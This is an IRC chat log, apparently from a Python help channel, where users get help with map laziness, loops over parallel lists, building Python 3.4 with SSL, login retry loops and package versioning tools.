[16:48:47] <SkyLeach> ok so the reason I'm asking is because it doesn't seem to have executed against the list yet
[16:48:53] <altendky> SkyLeach: you could also just print(type(the_result))
[16:48:55] *** Joins: Anticom (~Anticom@2001:67c:2184:410:f591:5282:69d0:a3f9)
[16:48:58] *** Quits: DrBrownBear (~DrBrownbe@96.44.147.42) (Ping timeout: 264 seconds)
[16:49:05] <SkyLeach> oh wait
[16:49:07] <SkyLeach> damnit
[16:49:12] <SkyLeach> ok this is 3.7
[16:49:15] <han-solo> ah
[16:49:17] <SkyLeach> not 2.7
[16:49:27] <SkyLeach> I'm running code in both so sorry for the confusion
[16:49:35] <anddam> I made a very bad version of str rotation with a string comprehension, is there a clean approach to a single liner for it?
[16:49:36] <altendky> SkyLeach: it happens :]
[16:49:40] <anddam> just for the sake of curiosity
[16:49:47] <SkyLeach> this is a notebook running in ipython to analyze results from a 2.7 application
[16:49:50] *** Quits: methyl (~methyl@unaffiliated/methyl) (Ping timeout: 256 seconds)
[16:49:51] *** Quits: russoisraeli (~igor@pool-108-5-134-231.nwrknj.fios.verizon.net) (Quit: Leaving)
[16:50:00] <WhileTrue> yes, I used ord, but got stuck with it. I dont know about building dict yet, and, since the author suggests the former way at this stage, I will try to solve it from where I got stuck.
[16:50:07] <Wooble> SkyLeach: then yes, you get an iterator that doesn't call the function until you iterate it.
[16:50:11] <anddam> altendky: does the explanation about the gist makes it clearer?
[16:50:26] <altendky> WhileTrue: change the part where you are trying to modify and instead just build a new string
[16:50:36] <jayjo_> I'm not sure how I would use a namedtuple to produce a dict with named values as opposed to the col: val standard
[16:50:41] <Wooble> SkyLeach: (also using map with a lambda is kind of ugly; why not not just (func(x) for x in mylist) ?
[16:50:41] <altendky> anddam: i made up `alphabet = 'abcdefg'; forward = dict(zip(alphabet, [*alphabet[N:], *alphabet[:N])); result = ''.join(forward[c] for c in word)` just now (untested)
[16:50:42] <WhileTrue> altendky, right, I will do it
[16:50:42] <han-solo> anddam: can you paste that ?
[16:50:43] *** Quits: Avinash (~Avinash@unaffiliated/avinash) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[16:51:16] <SkyLeach> ok so what would be the pythonic / correct way to consume the map?  I know I can just do [<map>] or list(<map>) but since it will always be an empty list is there a more 'pythonic' way of doing it?
[16:51:25] *** Quits: Darkhunter (~mmojzis@ip-86-49-120-171.net.upcbroadband.cz) (Quit: Leaving.)
[16:51:52] <altendky> anddam: assuming you aren't doing any funny business where `not in` is not the opposite of `in` or somesuch then yeah, i'm pretty sure it's just an else
[16:51:53] <Wooble> SkyLeach: you're not using the return values? Just write a for loop.
[16:51:55] <zalt> how would you take the length of an iterable without turning it into a list then taking its len
[16:52:05] <han-solo> zalt: you don't
[16:52:19] <Wooble> zalt: not all iterables even have a length...
[16:52:26] *** Joins: philr (~phil@ppp121-45-86-74.bras1.adl6.internode.on.net)
[16:52:28] <altendky> zalt: sum(1 for x in the_iterable)  but this consumes it
[16:52:36] <SkyLeach> Wooble: either way doesn't really matter except 1 line vs 2 or 3.  I'm applying a list of titles to a list of 87 subplots
[16:52:37] <zalt> yes, that's what i meant
[16:52:50] <zalt>  i know there is no way to find that without consuming it :D
[16:53:04] <han-solo> zalt: you can make a custome iterator with that functionality
[16:53:04] <SkyLeach> the 1 liner: map(lambda x: p.set_title(x), subplt_titles)
[16:53:09] <han-solo> i guess
[16:53:17] <han-solo> maybe :/
[16:53:21] *** Quits: edne (~edne@net-2-42-74-190.cust.vodafonedsl.it) (Ping timeout: 248 seconds)
[16:53:42] <altendky> SkyLeach: i believe the python way to consume an iterable with no result is `for _ in it: pass`.  so you may as well just write a loop to begin with
[16:53:54] <siege> fwiw,  map(p.set_title, subplt_titles)
[16:54:07] <altendky> that too
[16:54:07] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[16:54:07] *** Quits: jb1123 (~Thunderbi@2a02:a03f:5230:2400:4db:7475:7a25:44a2) (Ping timeout: 256 seconds)
[16:54:07] <han-solo> *stuff = iterable # :)
[16:54:10] *** Joins: derk0pf (~derk0pf@p5497B8F0.dip0.t-ipconnect.de)
[16:54:24] <altendky> han-solo: then you are holding onto the stuff?
[16:54:26] <SkyLeach> crap, that's not the right code anyhow.
[16:54:26] <han-solo> er, *stuff, = iterable
[16:54:35] *** Joins: unpythonic (~unpythoni@c-98-207-240-139.hsd1.ca.comcast.net)
[16:55:02] <siege> but, in python3, map is lazy, and won't actually perform those operations until you iterate it all :)
[16:55:02] <han-solo> Nah, nothing related, i'm just putting out,something i always confused with :)
[16:55:02] <SkyLeach> should be: map(lambda x, y: x.set_title(y), zip(plt,subplt_titles))
[16:55:23] <altendky> SkyLeach: should be a for loop
[16:55:36] <SkyLeach> altendky: ok lemme see if I can get this right
[16:55:38] <siege> map only works on unary functions
[16:55:44] <altendky> SkyLeach: that's the pythonic way to do something to a bunch of things
[16:55:46] <jayjo_> is it possible to change this to get labeled values? https://bpaste.net/show/ed0992e57f35
[16:56:00] <altendky> siege: naw, it can take multiple iterables
[16:56:48] <siege> now with that zip though, right?
[16:56:51] *** Quits: nelsnelson (~nelsnelso@rrcs-71-42-191-12.sw.biz.rr.com) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[16:56:52] <siege> "not with..."
[16:57:14] <altendky> siege: well, zip isn't the way to do this, no.  not with map.  but map's wrong anyways so...
[16:57:20] *** Quits: backnforth (~backnfort@mctnnbsa45w-156-34-60-65.dhcp-dynamic.fibreop.nb.bellaliant.net) (Ping timeout: 276 seconds)
[16:57:23] <altendky> back to zip
[16:57:33] <altendky> or not-parallel-lists
[16:57:39] <SkyLeach> for x, y in zip(plt, subplt_titles): x.set_title(y) ?
[16:57:44] <anddam> han-solo: what do you mean?
[16:57:53] <SkyLeach> ^^ the best way?
[16:57:56] <altendky> SkyLeach: sure.  unless you can avoid the parallel lists
[16:58:11] <SkyLeach> altendky: can't really.  The list of plots is generated by a single function call
[16:58:12] <altendky> SkyLeach: maybe `for plot, title in...`
[16:58:27] <SkyLeach> well sure naming would be better altendky :-)
[16:58:28] <anddam> altendky: yea, I'm not even sure why my brain was alerting me
[16:58:41] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 248 seconds)
[16:58:48] <altendky> anddam: because it's just convoluted enough to look like it has a purpose
[16:59:02] *** Joins: rpkilby (~rpkilby@152.7.255.194)
[16:59:10] <altendky> anddam: which it doesn't seem to, but my eyes have deceived me before
[16:59:48] *** Joins: root3d_ (~root3d@unaffiliated/root3d)
[16:59:59] <meejah> i'm trying to make python3.4 work, but get "pip is configured with locations that require TLS/SSL, however the ssl module in Python is not available" .. do I have to do something special to get TLS support? (configure --help didn't show anything promising, and i have libssl-dev installed)
[17:00:10] *** Joins: raikiasec (~raikiasec@unaffiliated/raikiasec)
[17:00:30] <altendky> meejah: i had to install an old version of libssl when i built 3.4 on debian with pyenv.  handily, they had a package for it
[17:00:41] *** Joins: edne (~edne@net-2-42-74-190.cust.vodafonedsl.it)
[17:00:46] *** Joins: ramsub07 (~Instantbi@136.206.119.145)
[17:01:15] <altendky> meejah: it might be libssl1.0.2 and libssl1.1 for newer stuff.
[17:01:26] <SkyLeach> ok thanks guys
[17:01:40] <altendky> meejah: what os?  are you building from scratch?  or pyenv?
[17:01:41] <meejah> altendky: thanks. my desire to make the answer "python3.4 is old, don't use it" has increased...
[17:01:42] <SkyLeach> for future I'll do it the for loop way
[17:02:03] <meejah> altendky: Debian. I didn't see a python3.4 binary package to download, so yes I'm building from source
[17:02:06] <altendky> meejah: yeah, but i think 3.4 is still considered 'modern'.  i think it's a common cutoff presently
[17:02:20] <altendky> meejah: consider pyenv.  but you'll still have to get deps like libssl1.0.2
[17:02:26] *** Joins: jb1123 (~Thunderbi@2a02:a03f:5230:2400:4db:7475:7a25:44a2)
[17:02:26] <CrtxReavr> Last time I checked, 3.4 was the newest version you could sanely use on RHAT-drived distros.
[17:02:28] *** Joins: rns_ (~rns@2601:345:8302:b77:8872:3ad:1834:baac)
[17:02:36] <meejah> txtorcon's docs claim 3.4, but it's not actually in my tox setup :/ oops
[17:02:42] *** Quits: root3d (~root3d@unaffiliated/root3d) (Ping timeout: 245 seconds)
[17:02:43] <CrtxReavr> Even that had to come out of EPEL.
[17:02:55] *** Joins: mrjohns (~juan@unaffiliated/mrjohns)
[17:02:57] <altendky> meejah: for other deps that pyenv encourages anddam: i made up `alphabet = 'abcdefg'; forward = dict(zip(alphabet, [*alphabet[N:], *alphabet[:N])); result = ''.join(forward[c] for c in word)` just now (untested)
[17:02:59] <altendky> err
[17:03:07] <altendky> meejah: for other deps that pyenv encourages https://github.com/pyenv/pyenv/wiki
[17:03:16] *** Joins: sdwrage (~textual@64.247.67.53)
[17:03:31] *** Church- is now known as Gendo-
[17:03:46] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[17:03:55] *** Joins: _Coffee (~quassel@2607:fea8:705f:f096:61a0:acb4:e199:a7c1)
[17:04:10] *** Joins: vovioheler (2e657e4f@gateway/web/freenode/ip.46.101.126.79)
[17:05:00] <han-solo> jayjo_: point = namedtuple('Point', 'x y');..d[k].append(point(key, v)) ?
[17:05:21] <vovioheler> hello, when i iterate over some list and i want to repeat the same index for some reason, whats the correct way to do it?
[17:05:28] <han-solo> enumerate
[17:05:31] <anddam> altendky: but is it convoluted? is there a better way to route an object into one of three destinations?
[17:05:37] *** Quits: rns (~rns@c-69-180-72-207.hsd1.fl.comcast.net) (Ping timeout: 268 seconds)
[17:05:44] <han-solo> repeat the same index ?
[17:05:58] <han-solo> same as in ?..
[17:06:07] <bjs> vovioheler: what do you mean by repeat the same index?
[17:06:09] *** Quits: Allegretto (~allegrett@212.52.160.157) (Ping timeout: 248 seconds)
[17:06:10] *** Joins: renlo (~lhoward@4.14.106.6)
[17:06:13] <anddam> vovioheler: do the thing that you need without repeating
[17:06:16] <vovioheler> example for user in userlist:
[17:06:28] <vovioheler> a user fails to log in and i want to try again
[17:06:42] <vovioheler> im using a while inside the for loop
[17:06:43] <meejah> altendky: great, thanks
[17:06:47] <han-solo> l = [1,2,3,4,5] -> (0,1), (1,2).. ?
[17:06:49] <vovioheler> isnt there a better way to do it?
[17:07:01] <bjs> han-solo: now you're just guessing
[17:07:06] <anddam> vovioheler: are you manually doing the login?
[17:07:07] *** Quits: msh3iny (~mike@gateway/tor-sasl/sh3iny) (Ping timeout: 250 seconds)
[17:07:08] <han-solo> bjs: um
[17:07:12] *** Quits: amirpro (~amirpro@41.235.244.66) (Remote host closed the connection)
[17:07:16] <han-solo> bjs: Yeah :)
[17:07:25] *** Joins: sh3iny (~mike@gateway/tor-sasl/sh3iny)
[17:07:30] <han-solo> vovioheler: can we see some code ?
[17:07:42] <anddam> vovioheler: either use a blocking call or put users that fails in a separate bucket to be re-logged
[17:07:49] *** Joins: dviola (~diego@unaffiliated/dviola)
[17:08:04] <vovioheler> anddam: yea i dont want to do that
[17:08:05] <anddam> but even the blocking call will have to expire at some point
[17:08:07] *** Quits: electrofelix (~pelix@15.203.233.80) (Quit: Leaving.)
[17:08:09] <han-solo> oh, now the context has come, i provided a very weird answer :)
[17:08:25] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 260 seconds)
[17:08:30] *** Quits: L00P3X (~L00P3X@gateway/tor-sasl/l00p3x) (Quit: Leaving)
[17:08:48] <vovioheler> anddam: doing for user in userlist: # here i need something to bring back the same user index
[17:08:48] *** Quits: quxgyver (uid302084@gateway/web/irccloud.com/x-qygvuhuyveejljxo) (Quit: Connection closed for inactivity)
[17:08:59] *** Joins: sunil_bansal (~sunil_ban@183.82.16.215)
[17:09:44] *** Quits: antgel (~topdog@141.226.120.30) (Ping timeout: 255 seconds)
[17:09:52] *** Joins: Nickeeh (~quassel@bulbasaur.sjorsgielen.nl)
[17:10:01] <altendky> anddam: use else?
[17:10:36] <altendky> anddam: i only meant that the last elif that seems like an else was just weird enough to make it look like it had a purpose.  otherwise it's an if/elif/else.  whatever :]
[17:11:18] *** Joins: rudrab (~rudrab@14.139.59.140)
[17:12:04] <altendky> i've only really done debugging with gui stuff like pycharm.  but, with long-running tasks it's prohibitive to debug since it takes even longer to get to the point of interest.  is it possible to launch in regular run mode but have a line of code that triggers a transition to debug mode?  then i could add that right before the break point i'm interested in.
[17:12:21] <Samian> Hi
[17:12:26] <vovioheler> i'm doing it like this https://paste.pound-python.org/show/jGhFcC26gyXIN5kulCzO/
[17:12:32] <vovioheler> isnt a better way to do it?
[17:12:46] <Samian> is there a way to make it so when pasting full file paths in visual studio code, it uses double slashes?
[17:12:48] <han-solo> I heard VS code comes with some debugging stuff, some runtime breakpoints, i didn't read it all
[17:12:52] <bjs> vovioheler: I think that is the best way, it makes it very clear
[17:12:54] *** Joins: amirpro (~amirpro@41.235.244.66)
[17:13:02] <altendky> Samian: are you referring to paths?
[17:13:18] <Omega037> so what is setuptools_scm exactly and why should I use it?
[17:13:30] <altendky> Omega037: you should use versioneer instead
[17:13:40] *** Quits: sunil_bansal (~sunil_ban@183.82.16.215) (Ping timeout: 260 seconds)
[17:13:42] *** Joins: chachan_ (~chachan@ec2-35-164-24-42.us-west-2.compute.amazonaws.com)
[17:13:46] <Omega037> so i dont know either of these things
[17:13:56] <altendky> Omega037: they both help you use tags in your revision control system to define versions and will generate intermediate version numbers for untagged commits
[17:13:58] <Omega037> i just saw a reddit post where someone recommended using it
[17:13:59] <anddam> altendky: like set_trace()
[17:14:01] <anddam> altendky: ?
[17:14:05] <altendky> anddam: maybe?  :]
[17:14:10] <Omega037> how does that work with CI like Jenkins?
[17:14:42] *** Quits: edne (~edne@net-2-42-74-190.cust.vodafonedsl.it) (Ping timeout: 265 seconds)
[17:14:46] *** Quits: ThiefMaster (~thief@indico/developer/thiefmaster) (Ping timeout: 256 seconds)
[17:14:54] <altendky> Omega037: it depends what you need.  i'm looking for a good example project of mine
[17:15:24] <han-solo> ..try:....do_login();..except Exception as exc....continue;..else:....break # :)
[17:15:26] <altendky> Omega037: https://github.com/altendky/gitignoreio
[17:15:29] <anddam> vovioheler: show some code, as han-solo suggested. I think that you're asking for a specific solution that may not be the appropriate way
[17:16:02] <altendky> Omega037: if i push a version tag i end up with a properly identified copy uploaded to pypi.  so i really do nothing except apply and push tags when i want them.
[17:16:05] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[17:16:16] <tos9> hogarius: ?
[17:16:27] *** Quits: Nickeeh (~quassel@bulbasaur.sjorsgielen.nl) (Ping timeout: 245 seconds)
[17:16:29] <anddam> han-solo: wouldn't the continue in exception block skip the login of current user, that has jkust failed?
[17:16:38] *** Quits: ShyPixie (IdentME@unaffiliated/shypixie) (Ping timeout: 260 seconds)
[17:16:38] *** Quits: ohcibi (~quassel@thisdone.de) (Ping timeout: 260 seconds)
[17:17:00] <altendky> Omega037: i think it's valuable to have intermediate versions `v1.0.3-post27` for example, 27 commits after v1.0.3.  and i also like being able to have a fully pushed and tested etc commit turn into a released version without a new commit
[17:17:01] <han-solo> anddam: Yes
[17:17:07] *** Quits: m0j0dj0dj0 (~punk3r@unaffiliated/m0j0dj0dj0) (Quit: go drink with my bitches!)
[17:17:16] *** Joins: vikikas (~vikas@2a02:1205:c6ad:ea0:9deb:71c8:a80f:fd43)
[17:17:20] *** Quits: chachan (~chachan@168.232.28.50) (Ping timeout: 245 seconds)
[17:17:20] *** Quits: rpg (~rpg@sift.net) (Ping timeout: 268 seconds)
[17:17:29] *** Quits: humitos (~humitos@152.169.140.157) (Ping timeout: 276 seconds)
[17:17:29] *** Quits: twandy (~Thunderbi@cas-fw-sta.inet.casair.net) (Quit: twandy)
[17:17:35] <han-solo> I'm presuming, he wanted the relogin to happen, if something went wrong :/
[17:17:51] *** Quits: uttam (~uttam@116.193.133.53) (Remote host closed the connection)
[17:17:51] <bjs> han-solo: vovioheler's code already did that with a nested `while True: ...` loop
[17:18:11] *** Quits: mefistofeles (~mefistofe@unaffiliated/mefistofeles) (Quit: Hay the guachu!)
[17:18:22] <bjs> they were asking if there was a "better" way. I'd say "no" because if there was another way it'd probably be worse than an explicit "keep attempting to login for this user" loop
[17:18:52] <anddam> oh I missed his URL
[17:18:59] <han-solo> bjs: Yeah, force of habit, i just use try/except/else, whenever i can :)
[17:19:31] <anddam> vovioheler: do you want the logins to happen in order?
[17:19:48] <zalt> i reduced the initialization time from 4.79 seconds to 3.13 :P
[17:19:49] *** Quits: root3d_ (~root3d@unaffiliated/root3d) (Read error: Connection reset by peer)
[17:19:51] <vovioheler> anddam: yes
[17:20:07] <han-solo> zalt: are you using python3 ?
[17:20:11] <zalt> yes
[17:20:12] *** Quits: ramsub07 (~Instantbi@136.206.119.145) (Ping timeout: 245 seconds)
[17:20:21] <han-solo> zalt: Okay
[17:20:27] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 240 seconds)
[17:20:29] *** Joins: root3d (~root3d@unaffiliated/root3d)
[17:20:44] *** Quits: _ADN_ (~username@5.148.34.186) (Ping timeout: 276 seconds)
[17:21:05] <anddam> vovioheler: too bad, I was thinking users = [put, users, here]; while users: for user in users: try: doLogin except: pass else: users.remove(user)
[17:21:20] *** Joins: Nickeeh (~quassel@bulbasaur.sjorsgielen.nl)
[17:21:21] *** Joins: ohcibi (~quassel@thisdone.de)
[17:21:21] *** Quits: Mikee_C (~michaelc@cpc82911-enfi22-2-0-cust257.20-2.cable.virginm.net) (Ping timeout: 264 seconds)
[17:21:25] <Omega037> altendky, i guess im confused how it differs from our system at work now
[17:21:27] <bjs> anddam: you could do something like that with a deque
[17:21:28] *** Joins: ThiefMaster (thief@indico/developer/thiefmaster)
[17:21:34] <zalt> damn, using primitive things like while loops is much faster than (umm, itertools) when you're in the hot sections of code :P
[17:21:38] <bjs> anddam: but pushleft (or whateever it's called)
[17:21:41] <anddam> vovioheler: so you iterate over the list but actually remove the success login, the remainder list is iterated over and over until falsey
[17:21:48] <Omega037> where if i make a commit with a release tag, Jenkins basically will autobuild and push to our internal PyPI
[17:21:49] <zalt> i've heard about the difference but i didn't believe it :P
[17:22:17] *** Quits: VikingHoarder (~VikingHoa@203.233.108.93.rev.vodafone.pt) (Remote host closed the connection)
[17:22:23] *** Quits: Technodrome (~textual@unaffiliated/technodrome) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[17:22:24] <altendky> anddam: yes, like set_trace, now that i read about it.  but dropping you into the pycharm debugger, not pdb.  :]
[17:22:34] *** Quits: njbair (~njbair@2605:a000:122d:c254:227:eff:fe0a:b289) (Max SendQ exceeded)
[17:22:39] *** Quits: therue (~therue@1-162-68-203.dynamic-ip.hinet.net) (Quit: WeeChat 2.1)
[17:22:56] <anddam> altendky: I'm not familiar with pycharm, but I figure you're not the first with this need and something can be arranged
[17:22:59] <altendky> zalt: iterators can reduce peak memory usage and latency of the first result.  they aren't globally for 'efficiency'
[17:23:02] *** Joins: njbair (~njbair@2605:a000:122d:c254:227:eff:fe0a:b289)
[17:23:10] <altendky> anddam: yeah, i'll dig around with the set_trace term
[17:23:10] <anddam> bjs: what's the advantage of deque in this case???
[17:23:18] <anddam> bjs: fat-fingered the question marks
[17:23:36] *** Quits: skorv (~skorv@a213-22-27-182.cpe.netcabo.pt) (Quit: Ex-Chat)
[17:24:00] <anddam> altendky: ipdb and pdbpp are very nice
[17:24:22] <altendky> anddam: i may head over that way for this, but i do like having my editor and debugger have the same view of the code
[17:24:31] <zalt> altendky: yeah, they have a lot of use cases that improve performance, but i meant  using iterators without a need (just because it's cool functional syntax :P)
[17:24:34] *** Joins: roxfan (roxfan@226.187-246-81.adsl-dyn.isp.belgacom.be)
[17:24:39] *** Joins: enriq (~pitagoras@190.104.249.158)
[17:24:42] *** Joins: Burrito (~Burrito@unaffiliated/burrito)
[17:25:12] *** Joins: blackandblue (~batdownh@gateway/tor-sasl/blackandblue)
[17:25:15] *** Quits: tom__ (~tom@p54B0E142.dip0.t-ipconnect.de) (Ping timeout: 245 seconds)
[17:26:04] <altendky> Omega037: do you locally get unique version numbers between tags?
[17:26:09] *** Quits: amirpro (~amirpro@41.235.244.66) (Remote host closed the connection)
[17:26:34] *** Joins: tom__ (~tom@p54B0E142.dip0.t-ipconnect.de)
[17:26:40] <bjs> anddam: vovioheler: https://paste.pound-python.org/show/mhejP2Fnfl83NOi1SkS1/
[17:26:45] *** Quits: MilkmanDan (~dan@wilug/expat/MilkmanDan) (Ping timeout: 264 seconds)
[17:26:59] <bjs> but imo it makes it harder to follow the control flow
[17:27:13] <Omega037> altendky, honestly i dont really start versioning until its something im pushing up
[17:27:22] *** Joins: amirpro (~amirpro@41.235.244.66)
[17:27:35] <bjs> but maybe vovioheler will prefer it, :)
[17:27:35] <Omega037> and then i make commits that arent ready to push
[17:27:51] <altendky> Omega037: ok.  but between tags?  do you just have a consider lie where you claim either the previous or next version even though it isn't either of them?
[17:27:53] <Omega037> and finally make commit/PR with a release tag
[17:28:20] <Omega037> the proper version is whatever the last release tag is
[17:28:22] *** Joins: MilkmanDan (~dan@wilug/expat/MilkmanDan)
[17:28:47] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[17:29:12] <altendky> Omega037: no, it isn't.  that's very misleading
[17:29:23] <altendky> Omega037: v1.0.3 is not the same as v1.0.3 plus 27 commits
[17:29:42] <altendky> Omega037: anyways, if you don't care...  so it goes
[17:29:57] *** Joins: etcetera (~etcetera@about/csharp/regular/etcetera)
[17:30:06] *** Quits: amirpro (~amirpro@41.235.244.66) (Remote host closed the connection)
[17:30:33] *** Joins: amirpro (~amirpro@41.235.244.66)
[17:31:05] <Omega037> im just saying how things are
[17:31:33] *** Joins: Afrix (~Afrix4@host-92-6-26-221.as43234.net)
[17:31:35] *** Joins: dagrha (~dazz@96-87-42-53-static.hfc.comcastbusiness.net)
[17:31:46] <Omega037> does every commit need a tag?
[17:32:11] <altendky> Omega037: no, that's the point.  but each should be uniquely identifiable and not masquerade as an actually released version
[17:32:26] <Omega037> isnt that what the commit message is for?
[17:32:29] <anddam> bjs: pretty clear solution tho'
[17:32:50] <altendky> Omega037: how does that get into your program's about dialog etc?  or into pip freeze?
[17:32:51] *** Joins: Kaedenn (~kaedenn@unaffiliated/kaedenn)
[17:33:10] <altendky> Omega037: also, no, commit messages are not identifiers.  commit hashes are
[17:33:14] <alicefreak> Hi guys, I'm tring to execute specific test using PyCharm. But I'm getting an error "No Module named StroageTests". I couldn't figure it out. Can you please take a look? Here is my code and traceback. https://pastebin.com/mNctVhVT . Thanks a lot.
[17:33:14] <infobob> https://paste.pound-python.org/show/CIhYvx9MyX4etIG97OpD/ (repasted for alicefreak)
[17:33:43] *** Joins: _xor (~xor@50.216.161.66.ded-dsl.fuse.net)
[17:33:58] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 264 seconds)
[17:34:45] *** Quits: ibiam (~ibiam@105.112.89.154) (Quit: ibiam)
[17:34:54] *** Joins: rpg (~rpg@ip-184-223-232-107.stplmn.spcsdns.net)
[17:34:57] *** Quits: mrjohns (~juan@unaffiliated/mrjohns) (Ping timeout: 248 seconds)
[17:34:57] *** Quits: colwem (~colwem@pool-74-104-146-49.bstnma.fios.verizon.net) (Read error: Connection reset by peer)
[17:35:24] <zalt> pickling the whole datastructure then reading it from disk saved another second, now it takes 2.3 seconds to initialize :P
[17:35:38] *** Gendo- is now known as Manfreds
[17:35:45] <altendky> Omega037: https://ci.appveyor.com/project/KyleAltendorf/st/history  not only are tag versions available in build results, they are available directly in the normal python places and in my about dialog.  not only for tags, but for every commit.  no more q: 'what version are you running?',  a: '1.0.3',  q: 'is that really 1.0.3 or something after?', a: 'i dunno'
[17:36:05] *** Manfreds is now known as Manfred
[17:36:10] *** Quits: Belxjander (~Belxjande@sourcemage/Mage/Abh-Elementalist) (Quit: AmigaOSv4.1.6+//PowerPC native)
[17:36:20] <Omega037> altendky, honestly my development processes are usually just making a release at a stopping point, then making changes in my spare time, and eventually bundling them as the new version
[17:36:33] *** Joins: Belxjander (~Belxjande@sourcemage/Mage/Abh-Elementalist)
[17:36:40] *** Joins: cjoy (~anonymous@HSI-KBW-046-005-019-033.hsi8.kabel-badenwuerttemberg.de)
[17:36:49] <Omega037> in the rare cases where i am developing with others, i do the same thing but on a dev branch, and then merge back at the release time
[17:37:01] <zalt> i bet if i used a more reasonable datastructure i'd be able to reduce that to say 0.5s
[17:37:15] *** Joins: GiLgAmEzH (~gilgamezh@unaffiliated/gilgamezh)
[17:37:27] *** Quits: RickDeckard (~tgburrin@108.60.152.194) (Ping timeout: 240 seconds)
[17:37:33] *** Joins: smt (~smt@unaffiliated/smt)
[17:37:49] *** Joins: carlomazzaferro (~carlomazz@50.225.11.6)
[17:37:51] <hogarius> tos9: I apologize.  I mistakenly tagged you with a blank message.
[17:38:10] <altendky> Omega037: versioneer (and to a lesser degree setuptools_scm) provides good integration with python stuff and more complete versioning.  it is used by others so they have a chance of being familiar with it unlike whatever you do in-house to embed versions into your code.  but, you seem satisfied with what you have and it's limitations.
[17:38:11] *** Quits: enriq (~pitagoras@190.104.249.158) (Read error: Connection reset by peer)
[17:38:23] *** Joins: realnot (~realnot@unaffiliated/realnot)
[17:38:39] *** Joins: enriq (~pitagoras@190.104.249.158)
[17:39:18] *** Joins: sol1x (~sol1x@ipb21bc229.dynamic.kabel-deutschland.de)
[17:39:27] *** Quits: vicenteH (~user@195.235.96.150) (Ping timeout: 240 seconds)
[17:39:32] *** elyezer_ is now known as elyezer
[17:40:05] *** Joins: mtellez_ (bbf05f31@gateway/web/freenode/ip.187.240.95.49)
[17:40:26] *** Joins: alish (c0770c73@gateway/web/freenode/ip.192.119.12.115)
[17:40:39] *** Joins: Mattiaslndstrm (~Mattiasln@2806:103e:9:257e:87b:ca12:784b:f877)
[17:40:51] *** Joins: SwiftMatt (~Objective@2601:282:4300:3e:c444:7b:bb39:e513)
[17:40:58] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[17:41:28] <alish> If I write a class that help me about getting items from a json, could I call it Helper Class?
[17:41:45] *** Joins: jjulian_ (~jjulian@i5DB5037D.pool.tripleplugandplay.com)
[17:41:46] <han-solo> zalt: try making whatever immutable
[17:41:51] <mtellez_> Hi, I want to asign a value to an already defined dict, like: "my_dict['some_key'] = new_value" but I type a colon instead the equal sign: "my_dict['some_key']: new_value" I get no syntax error, and but my_dict isn't updated, so, what does that statment? I try "x = my_dict['some_key']: new_value" and here I get a syntax error. I'm using python 3.6.5
[17:42:23] *** Quits: rpkilby (~rpkilby@152.7.255.194) (Remote host closed the connection)
[17:42:37] *** Quits: alish (c0770c73@gateway/web/freenode/ip.192.119.12.115) (Client Quit)
[17:42:51] *** Quits: Richard_Cavell (~Richard_C@unaffiliated/richard-cavell/x-0571696) (Ping timeout: 256 seconds)
[17:42:57] *** Quits: realnot (~realnot@unaffiliated/realnot) (Ping timeout: 248 seconds)
[17:43:15] *** Quits: rsrx (~rsrx@cable-94-189-226-199.dynamic.sbb.rs) (Read error: Connection reset by peer)
[17:43:31] <altendky> anddam: well, i forgot i had the feature for breaking on all exceptions enabled.  it's mighty nice, until you need the code to run at not 1% speed.  so at least it's faster i think.  it seems i'll have to request settrace functionality though
[17:43:35] <Yhg1s> mtellez_: with the ':' it's a type declaration. PEP 526.
[17:43:56] <Yhg1s> mtellez_: the type declaration doesn't do anything at runtime, so it has no effect.
[17:43:57] *** Joins: rsrx (~rsrx@cable-94-189-226-199.dynamic.sbb.rs)
[17:44:08] *** Quits: SwiftMatt (~Objective@2601:282:4300:3e:c444:7b:bb39:e513) (Client Quit)
[17:44:27] <fearnothing> ok, here's the function I'm troubleshooting Yhg1s: https://bpaste.net/show/51606a4a163b
[17:44:46] *** Quits: Oddity (~Oddity@unaffiliated/oddity) (Read error: Connection reset by peer)
[17:44:52] <fearnothing> prior to running this function, my zipfile has half a dozen items in it
[17:44:59] <fearnothing> (I'm httperr418 btw)
[17:45:20] *** Quits: jjulian (~jjulian@i5DB5037D.pool.tripleplugandplay.com) (Ping timeout: 276 seconds)
[17:45:30] <fearnothing> after running it, it only has the files selected by this function
[17:45:33] *** Joins: adoua (~adoua@unaffiliated/adoua)
[17:45:35] <fearnothing> and I don't understand why
[17:45:52] <fearnothing> when I test this in python cli, it works perfectly
[17:46:20] *** Quits: StygianBlues (~StygianBl@74-194-176-205.chstcmtk03.res.dyn.suddenlink.net) (Ping timeout: 260 seconds)
[17:46:27] *** Joins: Bahrouz (~Bahrouz@unaffiliated/bahrouz)
[17:46:32] *** Quits: Barones (~B@201.22.189.176.dynamic.adsl.gvt.net.br) (Remote host closed the connection)
[17:46:40] <ali1234> what is the purpose of _bootstrap._call_with_frames_removed? what are frames in this context, and why is it necessary to remove them?
[17:46:45] *** Joins: chachan (~chachan@196.40.47.129)
[17:46:57] *** Quits: willc (~willc@unaffiliated/willc) (Ping timeout: 240 seconds)
[17:47:00] *** Joins: internalsplit (~internals@c-24-16-133-129.hsd1.wa.comcast.net)
[17:47:31] *** Joins: takane2 (~tkane@2603:3005:2303:b100:9dec:14db:470f:a2f8)
[17:47:44] *** Joins: newpy (~ops2@lsvl-pf.massivenetworks.net)
[17:47:56] <mtellez_> Yhg1s: Thanks, I learned something new today.
[17:48:05] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 240 seconds)
[17:48:06] <Yhg1s> fearnothing: I can't reproduce this. Can you reproduce this if you call this code in isolation? What about if you write a single file with deterministic content?
[17:48:08] *** Joins: gopar (~gopar@c-73-170-87-193.hsd1.ca.comcast.net)
[17:48:46] *** Quits: dagrha (~dazz@96-87-42-53-static.hfc.comcastbusiness.net) (Quit: Leaving)
[17:48:54] <ali1234> ah never mind, i found the c source of it, and it explains what it is for
